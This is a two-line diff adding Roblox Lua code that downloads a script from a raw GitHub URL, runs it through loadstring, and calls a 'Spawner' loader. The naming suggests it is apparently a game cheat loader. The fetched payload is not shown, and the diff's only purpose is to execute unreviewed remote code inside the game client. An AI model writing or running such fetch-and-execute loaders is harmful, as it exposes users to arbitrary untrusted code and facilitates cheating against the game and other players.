@@ -1,0 +1,2 @@
+local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/lilbrolilbrohaha/dark/refs/heads/main/sab.lua"))()
+Spawner.Load()
